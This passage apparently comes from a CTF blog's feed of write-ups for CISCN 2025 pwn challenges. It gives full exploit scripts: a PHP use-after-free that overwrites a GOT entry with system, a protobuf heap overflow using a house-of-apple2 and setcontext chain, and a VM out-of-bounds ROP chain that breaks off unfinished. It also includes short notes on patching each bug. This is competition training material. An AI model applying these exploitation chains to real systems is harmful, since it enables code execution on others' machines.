invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex64</span>(<span class="variable">$libc_base</span>) . <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex64</span>(<span class="variable">$mod_base</span>) . <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$efree_addr</span> = <span class="variable">$mod_base</span> + <span class="number">0x4060</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">construct</span>(<span class="number">10</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">0</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">0</span>, <span class="title function_ invoke__">int2Str</span>(<span class="variable">$efree_addr</span>));</span><br><span class="line"><span class="title function_ invoke__">construct</span>(<span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">0</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">1</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">0</span>, <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">1</span>, <span class="title function_ invoke__">int2Str</span>(<span class="variable">$libc_base</span> + <span class="number">0x44af0</span>));</span><br><span class="line"><span class="title function_ invoke__">clear</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>UAF任意地址分配，改efree got表为system</p>
<h1 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h1><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>一个简单的protobuf，堆溢出</p>
<p>推销一下protobuf自动提取</p>
<p><a class="link"   href="https://bbs.kanxue.com/thread-285969.htm" >https://bbs.kanxue.com/thread-285969.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175749372.png"
                      alt="image-20250317175749372"
                ></p>
<p>没有对size做检查，就memcpy，将memcpy长度patch为0x20即可</p>
<h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> HeapPayload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HeapPayload</span> &#123;</span><br><span class="line">     <span class="type">int32</span> <span class="keyword">option</span> = <span class="number">1</span>;</span><br><span class="line">     <span class="type">int32</span> chunk_sizes = <span class="number">2</span>;</span><br><span class="line">     <span class="type">int32</span> heap_chunks_id = <span class="number">3</span>;</span><br><span class="line">     <span class="type">bytes</span> heap_content = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;10.10.1.108 21784&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Your prompt &gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    proto = ctf_pb2.HeapPayload()</span><br><span class="line">    proto.option = <span class="number">1</span></span><br><span class="line">    proto.chunk_sizes = size</span><br><span class="line">    proto.heap_chunks_id = <span class="number">0</span></span><br><span class="line">    proto.heap_content = content</span><br><span class="line">    d = proto.SerializeToString()</span><br><span class="line">    sa(input_after_this, p32(<span class="built_in">len</span>(d)))</span><br><span class="line">    s(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    proto = ctf_pb2.HeapPayload()</span><br><span class="line">    proto.option = <span class="number">2</span></span><br><span class="line">    proto.chunk_sizes = <span class="number">0</span></span><br><span class="line">    proto.heap_chunks_id = idx</span><br><span class="line">    proto.heap_content = <span class="string">b&#x27;inkey&#x27;</span></span><br><span class="line">    d = proto.SerializeToString()</span><br><span class="line">    sa(input_after_this, p32(<span class="built_in">len</span>(d)))</span><br><span class="line">    s(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data, len1=<span class="number">0</span></span>):</span><br><span class="line">    proto = ctf_pb2.HeapPayload()</span><br><span class="line">    proto.option = <span class="number">3</span></span><br><span class="line">    proto.chunk_sizes = <span class="number">0x400</span></span><br><span class="line">    proto.heap_chunks_id = idx</span><br><span class="line">    proto.heap_content = data</span><br><span class="line">    d = proto.SerializeToString()</span><br><span class="line">    <span class="keyword">if</span> len1 == <span class="number">0</span>:</span><br><span class="line">        sa(input_after_this, p32(<span class="built_in">len</span>(d)))</span><br><span class="line">        s(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sa(input_after_this, p32(len1))</span><br><span class="line">        s(d.ljust(len1, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    proto = ctf_pb2.HeapPayload()</span><br><span class="line">    proto.option = <span class="number">4</span></span><br><span class="line">    proto.chunk_sizes = <span class="number">0</span></span><br><span class="line">    proto.heap_chunks_id = idx</span><br><span class="line">    proto.heap_content = <span class="string">b&#x27;inkey&#x27;</span></span><br><span class="line">    d = proto.SerializeToString()</span><br><span class="line">    sa(input_after_this, p32(<span class="built_in">len</span>(d)))</span><br><span class="line">    s(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    proto = ctf_pb2.HeapPayload()</span><br><span class="line">    proto.option = <span class="number">5</span></span><br><span class="line">    proto.chunk_sizes = <span class="number">0</span></span><br><span class="line">    proto.heap_chunks_id = <span class="number">0</span></span><br><span class="line">    proto.heap_content = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">    d = proto.SerializeToString()</span><br><span class="line">    sa(input_after_this, p32(<span class="built_in">len</span>(d)))</span><br><span class="line">    s(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    brva 0x186F</span></span><br><span class="line"><span class="string">    brva 0x19E7</span></span><br><span class="line"><span class="string">    brva 0x1B62</span></span><br><span class="line"><span class="string">    brva 0x1C3F</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # brva 0x1D68</span></span><br><span class="line"><span class="string">    # b _IO_wfile_underflow</span></span><br><span class="line"><span class="string">    # b __libio_codecvt_in</span></span><br><span class="line"><span class="string">    b setcontext</span></span><br><span class="line"><span class="string">    set $heap = $rebase(0x5060)</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.39</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">add(<span class="number">0x138</span>, <span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line">add(<span class="number">0x138</span>, <span class="string">b&#x27;3333&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x140</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x140</span>)</span><br><span class="line">heap_base = (u64_ex(r(<span class="number">5</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x7000</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x138</span>, <span class="string">b&#x27;b&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x258</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x458</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x458</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x258</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x330</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x203D30</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x258</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x258</span>, <span class="string">b&#x27;b&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x258</span>, <span class="string">b&#x27;b&#x27;</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x240</span> + p64(libc.sym.mprotect) * <span class="number">4</span> + p64(protect_ptr(heap_base + <span class="number">0x5770</span>, libc.sym._IO_list_all - <span class="number">0x0</span>)))</span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line">rbx = CG.pop_rbx_ret()</span><br><span class="line">mov_rdx_rbx = libc_base + <span class="number">0xB0133</span>  <span class="comment">#: mov rdx, rbx; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line">payload0 = flat([rbx, <span class="number">7</span>, mov_rdx_rbx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, libc.sym.mprotect, heap_base + <span class="number">0x58A8</span>]) + ShellcodeMall.amd64.cat_flag</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = heap_base + <span class="number">0x5770</span></span><br><span class="line">payload1 = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: u64_ex(<span class="string">&quot;  sh&quot;</span>),</span><br><span class="line">        <span class="number">0x28</span>: libc.sym.setcontext,  <span class="comment"># function</span></span><br><span class="line">        <span class="number">0x68</span>: heap_base,</span><br><span class="line">        <span class="number">0x70</span>: <span class="number">0x10000</span>,</span><br><span class="line">        <span class="number">0x88</span>: heap_base,</span><br><span class="line">        <span class="number">0xA0</span>: fake_IO_FILE + <span class="number">0xD0</span> - <span class="number">0xE0</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        <span class="number">0xA8</span>: libc_base + <span class="number">0x4D68C</span>,</span><br><span class="line">        <span class="number">0xD0</span>: fake_IO_FILE + <span class="number">0x28</span> - <span class="number">0x68</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line">        <span class="number">0xD8</span>: libc.sym._IO_wfile_jumps,  <span class="comment"># vtable _IO_wfile_jumps-0x48</span></span><br><span class="line">        <span class="number">0xE0</span>: heap_base + <span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0xF8</span>: payload0,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x258</span>, payload1)</span><br><span class="line"></span><br><span class="line">revio = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xE0</span> + flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="number">0xFBAD2087</span>,</span><br><span class="line">        <span class="number">8</span>: p64(libc_base + <span class="number">0x204643</span>) * <span class="number">7</span>,</span><br><span class="line">        <span class="number">64</span>: libc_base + <span class="number">0x204644</span>,</span><br><span class="line">        <span class="number">112</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">120</span>: -<span class="number">1</span>,</span><br><span class="line">        <span class="number">136</span>: libc_base + <span class="number">0x205710</span>,</span><br><span class="line">        <span class="number">144</span>: -<span class="number">1</span>,</span><br><span class="line">        <span class="number">160</span>: libc_base + <span class="number">0x2037E0</span>,</span><br><span class="line">        <span class="number">192</span>: p32_ex(-<span class="number">1</span>) + p32(<span class="number">0</span>),</span><br><span class="line">        <span class="number">216</span>: libc.sym._IO_file_jumps,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x258</span>, p64(fake_IO_FILE) * <span class="number">4</span> + revio)</span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">exit_()</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>打的是house of apple2，rip控制为setcontext，然后mprotect，orw</p>
<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h2><p><code>snprintf</code> 的参数顺序错了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180347961.png"
                      alt="image-20250317180347961"
                ></p>
<p>应为<code>snprintf(s, maxlen, format);</code>，题目将maxlen放在后面，因此我们输入的是format，存在格串和堆溢出</p>
<p>将参数位置调整回来即可</p>
<h1 id="post-quantum"><a href="#post-quantum" class="headerlink" title="post_quantum"></a>post_quantum</h1><h2 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h2><p>好长的题目，不读不读（</p>
<p>将<code>sub_1B90()</code>中两个free全nop掉就过了，不懂原理（（（🫠</p>
<p>附一张排名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180632006.png"
                      alt="image-20250317180632006"
                ></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ciscn</tag>
        <tag>AWDP</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2025-初赛</title>
    <url>/202412/17/ciscn-2025-%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="Ciscn-2025-初赛-PWN"><a href="#Ciscn-2025-初赛-PWN" class="headerlink" title="Ciscn 2025 初赛 PWN"></a>Ciscn 2025 初赛 PWN</h1><h2 id="avm"><a href="#avm" class="headerlink" title="avm"></a>avm</h2><p>index只检查最低一位造成的越界读写，读写是栈上的数据，因此ROP即可</p>
<p>读取main函数的返回地址，计算偏移得到<code>system(&quot;/bin/sh&quot;)</code></p>
<p>由于程序不能输入数字，只能自己构造，非常恶心</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;8.147.132.32 16814&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">1</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">2</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">3</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">4</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">5</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">6</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">8</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">reg1, reg2, reg3</span>):</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">7</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (reg3 &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">reg1, reg2, off</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    s[reg2 + off] = reg1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">9</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (off &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lea</span>(<span class="params">reg1, reg2, off</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    reg1 = s[reg2 + off]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p32_ex((<span class="number">10</span> &lt;&lt; <span class="number">0x1C</span>) + (reg1 &lt;&lt; <span class="number">0</span>) + (reg2 &lt;&lt; <span class="number">5</span>) + (off &lt;&lt; <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">target_value</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct_steps_and_shift_indices</span>(<span class="params">target_value</span>):</span><br><span class="line">        steps = []</span><br><span class="line">        shift_indices = []</span><br><span class="line"></span><br><span class="line">        shift_value = <span class="number">1</span></span><br><span class="line">        shift_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> shift_value &lt;= target_value:</span><br><span class="line">            shift_count += <span class="number">1</span></span><br><span class="line">            shift_value = <span class="number">1</span> &lt;&lt; shift_count</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> target_value &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> shift_value &lt;= target_value:</span><br><span class="line">                steps.append(<span class="string">f&quot;(1 &lt;&lt; <span class="subst">&#123;shift_count&#125;</span>)&quot;</span>)</span><br><span class="line">                shift_indices.append(shift_count)</span><br><span class="line">                target_value -= shift_value</span><br><span class="line">            shift_count -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> shift_count &gt;= <span class="number">0</span>:</span><br><span class="line">                shift_value = <span class="number">1</span> &lt;&lt; shift_count</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> steps, shift_indices</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">adjacent_differences</span>(<span class="params">arr</span>):</span><br><span class="line">        <span class="keyword">return</span> [-(arr[i + <span class="number">1</span>] - arr[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr) - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    steps, shift_indices = construct_steps_and_shift_indices(target_value)</span><br><span class="line"></span><br><span class="line">    shift_indices.append(<span class="number">0</span>)</span><br><span class="line">    result = adjacent_differences(shift_indices)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    brva 0x1AAD</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set $s = $rsi</span></span><br><span class="line"><span class="string">    set $code = $rebase(0x40C0)</span></span><br><span class="line"><span class="string">    dis 1</span></span><br><span class="line"><span class="string">    #brva 0x1950</span></span><br><span class="line"><span class="string">    #brva 0x1935</span></span><br><span class="line"><span class="string">    # lea</span></span><br><span class="line"><span class="string">    #brva 0x17EF</span></span><br><span class="line"><span class="string">    #brva 0x181F</span></span><br><span class="line"><span class="string">    # mov</span></span><br><span class="line"><span class="string">    #brva 0x16B0</span></span><br><span class="line"><span class="string">    # shr</span></span><br><span class="line"><span class="string">    #brva 0x1749</span></span><br><span class="line"><span class="string">    # shl</span></span><br><span class="line"><span class="string">    #brva 0x14EF</span></span><br><span class="line"><span class="string">    # div</span></span><br><span class="line"><span class="string">    brva 0x1AFC</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">lea(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0xFE</span>)</span><br><span class="line">div(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># reg[1] -&gt; 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># reg[2] -&gt; 2</span></span><br><span class="line">mul(<span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>)  <span class="comment"># reg[4] -&gt; 4</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># reg[3] -&gt; 3</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>)  <span class="comment"># reg[5] -&gt; 5</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>)  <span class="comment"># reg[6] -&gt; 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea(7, 0, 0x108)  # reg[7] -&gt; canary</span></span><br><span class="line">lea(<span class="number">0x10</span>, <span class="number">0</span>, <span class="number">0xD38</span>)  <span class="comment"># reg[0x10] -&gt; libc + 0x236b10</span></span><br><span class="line">lea(<span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[*] INFO  dis system 0x1f34a0</span></span><br><span class="line"><span class="string">[*] INFO  dis rdi 0x20c72b</span></span><br><span class="line"><span class="string">[*] INFO  dis bin 0x5e498</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x1eb555</span></span><br><span class="line"><span class="string">(1 &lt;&lt; 21) + (1 &lt;&lt; 18) + (1 &lt;&lt; 14) + (1 &lt;&lt; 10) = 0x1EB555</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x211ee0</span></span><br><span class="line"><span class="string">0x63c4d</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cal(<span class="number">0x655</span>):</span><br><span class="line">    sub(<span class="number">0x1D</span>, <span class="number">0x1D</span>, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1D</span>, i, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">1</span>)</span><br><span class="line">    shl(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x1E, 0x1E, 